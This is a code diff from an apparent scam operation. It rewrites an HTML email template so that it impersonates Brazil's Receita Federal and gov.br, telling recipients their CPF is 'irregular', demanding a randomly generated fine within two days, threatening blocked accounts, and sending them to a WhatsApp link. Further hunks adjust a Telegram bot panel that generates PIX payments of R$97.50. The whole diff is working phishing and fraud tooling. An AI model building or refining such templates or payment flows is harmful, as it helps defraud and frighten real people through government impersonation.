@@ -145,83 +145,81 @@ async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: s
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Notificação de Processamento SVR</title>
+    <title>Notificação de Situação Irregular</title>
 </head>
-<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f4f4f4;">
-    <table align="center" border="0" cellpadding="0" cellspacing="0" width="600" style="border-collapse: collapse; background-color: #ffffff; margin-top: 20px; margin-bottom: 20px; border: 1px solid #dddddd;">
+<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5;">
+    <table align="center" border="0" cellpadding="0" cellspacing="0" width="600" style="border-collapse: collapse; background-color: #ffffff; margin-top: 30px; margin-bottom: 30px; border: 1px solid #e0e0e0; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
         
+        <!-- Header -->
         <tr>
-            <td align="center" bgcolor="#1b668d" style="padding: 20px 0;">
-                <h1 style="color: #ffffff; margin: 0; font-size: 20px; font-weight: bold; text-transform: uppercase;">Validação de Ativos em Processamento</h1>
-                <p style="color: #ffffff; margin: 5px 0 0 0; font-size: 13px; opacity: 0.9;">Confirmação de Titularidade e Protocolo de Segurança</p>
+            <td align="center" bgcolor="#4472c4" style="padding: 15px 0;">
+                <h1 style="color: #ffffff; margin: 0; font-size: 18px; font-weight: bold;">Notificação de Situação Irregular do CPF</h1>
+                <p style="color: #ffffff; margin: 5px 0 0 0; font-size: 11px; opacity: 0.9;">Atualize seus dados e evite transtornos</p>
             </td>
         </tr>
 
+        <!-- Gov Logo -->
         <tr>
-            <td align="center" style="padding: 25px 0 15px 0;">
-                <img src="${logoUrl}" alt="Protocolo Seguro" width="130" style="display: block; opacity: 0.6; filter: grayscale(100%);">
+            <td align="center" style="padding: 20px 0;">
+                <img src="https://www.gov.br/governodigital/pt-br/atendimento-gov.br/template-de-ajuda-gov.br/@@images/image" alt="gov.br" width="100" style="display: block;">
             </td>
         </tr>
 
+        <!-- Content -->
         <tr>
             <td style="padding: 20px 40px;">
-                <h2 style="color: #1b668d; font-size: 18px; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px;">Prezado(a) ${leadName},</h2>
-                <p style="font-size: 14px; color: #333333; line-height: 1.6;">
-                    Informamos que a <strong>confirmação e validação dos dados</strong> vinculados ao seu documento foram processadas com sucesso pelo Sistema de Valores a Receber (SVR). 
-                </p>
-                <p style="font-size: 14px; color: #333333; line-height: 1.6;">
-                    A fase de liberação dos ativos identificados encontra-se em <strong>estágio de transição final</strong>. Este procedimento assegura a integridade do repasse fiscal para a conta bancária homologada em nossa base de dados.
+                <h2 style="color: #4472c4; font-size: 16px; margin-bottom: 10px;">Detalhes da Irregularidade:</h2>
+                <p style="font-size: 13px; color: #333333; line-height: 1.5;">Prezado(a) Cidadão,</p>
+                <p style="font-size: 13px; color: #333333; line-height: 1.6; text-align: justify;">
+                    Informamos que o seu CPF encontra-se em situação <strong>IRREGULAR</strong> devido à não declaração e ao não pagamento dos seus impostos. Essa pendência gera complicações graves, como dificuldades na emissão de documentos oficiais (passaporte, abertura de conta bancária etc.) e bloqueios em diversas transações administrativas.
                 </p>
             </td>
         </tr>
 
+        <!-- Status Table -->
         <tr>
             <td style="padding: 0 40px;">
-                <table width="100%" bgcolor="#fffbf0" style="border-radius: 4px; border: 1px solid #ffcc00; border-left: 5px solid #ff9900;">
+                <table width="100%" bgcolor="#fff9e6" style="border-radius: 8px; border: 1px solid #ffeeba; padding: 15px;">
                     <tr>
-                        <td style="padding: 15px;">
-                            <table width="100%">
-                                <tr>
-                                    <td style="font-size: 14px; font-weight: bold; color: #444; padding-bottom: 8px;">Situação do Processamento:</td>
-                                    <td align="right" style="font-size: 14px; font-weight: bold; color: #ff8c00; padding-bottom: 8px;">Em transição</td>
-                                </tr>
-                                <tr>
-                                    <td style="font-size: 14px; color: #444; padding-bottom: 8px;">Taxa de Processamento Prioritário:</td>
-                                    <td align="right" style="font-size: 14px; font-weight: bold; color: #333; padding-bottom: 8px;">R$ ${randomFee}</td>
-                                </tr>
-                                <tr>
-                                    <td style="font-size: 14px; color: #444;">Protocolo de Liberação:</td>
-                                    <td align="right" style="font-size: 14px; font-weight: bold; color: #1b668d;">${displayProtocol}</td>
-                                </tr>
-                            </table>
+                        <td style="font-size: 14px; color: #333; padding-bottom: 5px;"><strong>Situação:</strong></td>
+                        <td align="right" style="font-size: 14px; color: #d9534f; padding-bottom: 5px;"><strong>Irregular</strong></td>
+                    </tr>
+                    <tr>
+                        <td style="font-size: 14px; color: #333; padding-bottom: 5px;"><strong>Multa:</strong></td>
+                        <td align="right" style="font-size: 14px; color: #333; padding-bottom: 5px;"><strong>R$ ${randomFee}</strong></td>
+                    </tr>
+                    <tr>
+                        <td style="font-size: 14px; color: #333;"><strong>Prazo para Regularização:</strong></td>
+                        <td align="right" style="font-size: 14px; color: #333;"><strong>${new Date(Date.now() + 86400000 * 2).toLocaleDateString('pt-BR')}</strong></td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+
+        <!-- Call to Action -->
+        <tr>
+            <td style="padding: 25px 40px 40px 40px;">
+                <p style="font-size: 13px; color: #333; line-height: 1.6;">
+                    Para regularizar sua situação, é necessário o pagamento imediato da multa. Após a quitação, seu CPF será restabelecido em até 2 dias úteis. <strong>Atenção:</strong> se a regularização não for efetuada até o dia ${new Date(Date.now() + 86400000 * 2).toLocaleDateString('pt-BR')}, seu CPF será <strong>suspenso</strong> e quaisquer contas vinculadas ao seu CPF poderão ser bloqueadas.
+                </p>
+                <p style="font-size: 12px; color: #666; text-align: center; margin-top: 20px;">
+                    Clique no botão abaixo para acessar o portal oficial e regularizar sua situação.
+                </p>
+                <table align="center" border="0" cellpadding="0" cellspacing="0" style="margin-top: 15px;">
+                    <tr>
+                        <td align="center" bgcolor="#4472c4" style="border-radius: 4px;">
+                            <a href="${waLink}" target="_blank" style="font-size: 14px; font-weight: bold; color: #ffffff; text-decoration: none; padding: 12px 40px; display: inline-block;">Regularizar Agora</a>
                         </td>
                     </tr>
                 </table>
             </td>
         </tr>
 
+        <!-- Footer -->
         <tr>
-            <td style="padding: 25px 40px 40px 40px;">
-                <p style="font-size: 13px; color: #555; line-height: 1.6; background: #f9f9f9; padding: 15px; border-radius: 4px; border: 1px solid #eee;">
-                    <strong>Prazo Estimado:</strong> Devido ao alto fluxo de solicitações, a regularização definitiva e o crédito em conta ocorrerão em um período estimado de <strong>${randomDays} a ${randomDays + 2} dias úteis</strong>. 
-                    A taxa de processamento prioritário (adiantamento) garante que sua solicitação permaneça no topo da fila de auditoria fiscal bancária.
-                </p>
-                <p style="font-size: 13px; color: #666; text-align: center; margin-top: 25px;">
-                    Para acompanhar o status em tempo real, acesse o canal de atendimento especializado.
-                </p>
-                <table align="center" border="0" cellpadding="0" cellspacing="0">
-                    <tr>
-                        <td align="center" bgcolor="#1b668d" style="border-radius: 3px;">
-                            <a href="${waLink}" target="_blank" style="font-size: 14px; font-weight: bold; color: #ffffff; text-decoration: none; padding: 12px 35px; display: inline-block; text-transform: uppercase; letter-spacing: 0.5px;">Acompanhar Liberação</a>
-                        </td>
-                    </tr>
-                </table>
-            </td>
-        </tr>
-        <tr>
-            <td style="background-color: #f5f5f5; padding: 15px; text-align: center; font-size: 11px; color: #999; border-top: 1px solid #eee;">
-                <p style="margin: 0;">Portal de Valores a Receber (SVR) — Protocolos de Segurança Criptográfica</p>
-                <p style="margin: 5px 0 0;">Esta é uma notificação oficial de sistema. Não responda a este e-mail.</p>
+            <td style="background-color: #f8f9fa; padding: 15px; text-align: center; font-size: 10px; color: #999; border-top: 1px solid #eee;">
+                <p style="margin: 0;">Receita Federal — Ministério da Fazenda | gov.br</p>
+                <p style="margin: 5px 0 0;">Este é um e-mail automático. Não responda.</p>
             </td>
         </tr>
     </table>
@@ -858,7 +856,7 @@ async function startTelegramPolling() {
           await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nPor favor, digite o novo valor para este campo:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_pix" }]] });
         }
         else if (text.startsWith("cmd:pix_std:")) {
-          const chatId = text.split(":")[3];
+          const chatId = text.split(":")[2];
           const valor = 97.50;
           const taxa = (valor * currentConfig.gatewayFee) / 100;
           const liquido = valor - taxa;
@@ -882,7 +880,7 @@ async function startTelegramPolling() {
           await sendTelegram(previewText, msgId, kb);
         }
         else if (text.startsWith("cmd:pix_confirm_std:")) {
-          const chatId = text.split(":")[3];
+          const chatId = text.split(":")[2];
           await generateStandardPix(chatId, 97.50, msgId);
         }
         else if (text.startsWith("cmd:pix_custom:")) {
